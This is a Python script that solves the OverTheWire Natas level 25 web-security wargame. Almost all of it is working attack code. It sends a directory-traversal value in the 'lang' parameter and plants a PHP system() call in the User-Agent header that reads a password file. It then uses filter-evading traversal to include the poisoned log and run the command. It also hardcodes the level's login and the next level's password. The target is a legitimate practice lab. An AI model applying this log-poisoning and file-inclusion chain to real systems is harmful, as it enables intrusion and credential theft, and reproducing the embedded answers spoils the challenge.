import requests
from string import *

username='natas25'
password='GHF6X7YwACaYYssHVY05cFq83hRktl4c'
url='http://natas25.natas.labs.overthewire.org/'
session=requests.Session()

response=session.post(url,data={"lang" : "../../../../../../"},auth=(username,password));

response=session.post(url,headers={"User-Agent" : "<?php system('cat /etc/natas_webpass/natas26'); ?>"},data={"lang" : "..././..././..././..././..././..././var/www/natas/natas25/logs/natas25_"+response.cookies['PHPSESSID']+".log"},auth=(username,password))
print response.text
print "="*80


#oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T
